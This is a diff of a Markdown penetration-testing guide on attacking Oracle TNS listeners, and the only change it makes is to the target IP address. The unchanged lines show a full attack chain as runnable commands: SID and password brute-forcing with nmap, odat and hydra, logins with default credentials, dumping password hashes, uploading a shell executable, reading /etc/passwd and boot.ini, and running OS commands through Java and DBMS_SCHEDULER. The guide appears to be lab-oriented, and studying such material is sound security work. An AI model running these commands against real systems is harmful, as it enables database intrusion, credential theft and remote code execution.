@@ -143,7 +143,7 @@ The combination of "exposed on the network" + "default accounts not locked" is t
 ### Service scan and version probe
 
 ```shell
-sudo nmap -sV -sC -p1521 10.129.14.128
+sudo nmap -sV -sC -p1521 10.0.14.128
 ```
 
 ```
@@ -154,7 +154,7 @@ PORT     STATE SERVICE VERSION
 The version (`11.2.0.2.0`) is volunteered by the listener without authentication. Cross-reference for known CVEs.
 
 ```shell
-sudo nmap -sV -p1521 --script "oracle-tns-version,oracle-sid-brute" 10.129.14.128
+sudo nmap -sV -p1521 --script "oracle-tns-version,oracle-sid-brute" 10.0.14.128
 ```
 
 ```
@@ -187,7 +187,7 @@ pip install cx_Oracle
 With that in place:
 
 ```shell
-odat sidguesser -s 10.129.14.128 -p 1521
+odat sidguesser -s 10.0.14.128 -p 1521
 ```
 
 ```
@@ -201,7 +201,7 @@ The default wordlist contains thousands of SIDs. For a wider sweep, point `--sid
 
 ```shell
 # All-version brute (slower but comprehensive)
-odat all -s 10.129.14.128 -p 1521
+odat all -s 10.0.14.128 -p 1521
 ```
 
 `odat all` runs every applicable check - sidguesser, passwordguesser, listener exploits, version-specific vulnerabilities - in sequence.
@@ -211,7 +211,7 @@ odat all -s 10.129.14.128 -p 1521
 Once you have SIDs, brute-force credentials against each:
 
 ```shell
-odat passwordguesser -s 10.129.14.128 -p 1521 -d XE \
+odat passwordguesser -s 10.0.14.128 -p 1521 -d XE \
   --accounts-file accounts.txt
 ```
 
@@ -225,14 +225,14 @@ The included `accounts.txt` covers the standard Oracle defaults. For environment
 The Hydra option:
 
 ```shell
-hydra -L users.txt -P passwords.txt oracle-listener://10.129.14.128 \
+hydra -L users.txt -P passwords.txt oracle-listener://10.0.14.128 \
   -s 1521 -F -t 4
 ```
 
 ### Connecting with sqlplus
 
 ```shell
-sqlplus SYSTEM/manager@10.129.14.128:1521/XE
+sqlplus SYSTEM/manager@10.0.14.128:1521/XE
 ```
 
 If `sqlplus` isn't installed locally, use Oracle Instant Client (rpm/deb from Oracle) or `sqlcl` (Java-based, more portable). On Kali, `apt install oracle-sqldeveloper` provides a usable client.
@@ -241,7 +241,7 @@ Connection options:
 
 ```shell
 # As SYSDBA (full DBA, requires SYSDBA privilege grant)
-sqlplus SYS/manager@10.129.14.128:1521/XE as sysdba
+sqlplus SYS/manager@10.0.14.128:1521/XE as sysdba
 
 # As SYSOPER (operations role)
 sqlplus user/password@target/SID as sysoper
@@ -320,7 +320,7 @@ SYSTEM          S:0E78EF<...>;H:F0E07<...>;T:5A1<...>
 ODAT can dump these directly:
 
 ```shell
-odat passwordstealer -s 10.129.14.128 -d XE -U SYSTEM -P manager
+odat passwordstealer -s 10.0.14.128 -d XE -U SYSTEM -P manager
 ```
 
 ### File read/write with ODAT
@@ -329,15 +329,15 @@ When you have a `CREATE ANY DIRECTORY` privilege (DBA has it, many other roles h
 
 ```shell
 # Upload a file
-odat utlfile -s 10.129.14.128 -d XE -U SYSTEM -P manager \
+odat utlfile -s 10.0.14.128 -d XE -U SYSTEM -P manager \
   --putFile C:/temp shell.exe /tmp/shell.exe
 
 # Download a file
-odat utlfile -s 10.129.14.128 -d XE -U SYSTEM -P manager \
+odat utlfile -s 10.0.14.128 -d XE -U SYSTEM -P manager \
   --getFile C:/ boot.ini ./boot.ini
 
 # External-table read (works with lower privileges sometimes)
-odat externaltable -s 10.129.14.128 -d XE -U SYSTEM -P manager \
+odat externaltable -s 10.0.14.128 -d XE -U SYSTEM -P manager \
   --getFile /etc passwd ./passwd
 ```
 
@@ -349,14 +349,14 @@ Multiple paths exist depending on version and privileges:
 
 ```shell
 # Java payload (Oracle 11g+, requires javaPrivilegeGrants)
-odat java -s 10.129.14.128 -d XE -U SYSTEM -P manager \
+odat java -s 10.0.14.128 -d XE -U SYSTEM -P manager \
   --exec /tmp 'id > /tmp/out'
 
 # CTXSYS.DRILOAD (Oracle 10g vulnerability)
-odat ctxsys -s 10.129.14.128 -d XE -U SCOTT -P tiger
+odat ctxsys -s 10.0.14.128 -d XE -U SCOTT -P tiger
 
 # Scheduler (DBMS_SCHEDULER) to run OS commands
-odat dbmsscheduler -s 10.129.14.128 -d XE -U SYSTEM -P manager \
+odat dbmsscheduler -s 10.0.14.128 -d XE -U SYSTEM -P manager \
   --exec 'cmd.exe /c whoami > C:\\temp\\out.txt'
 ```
 
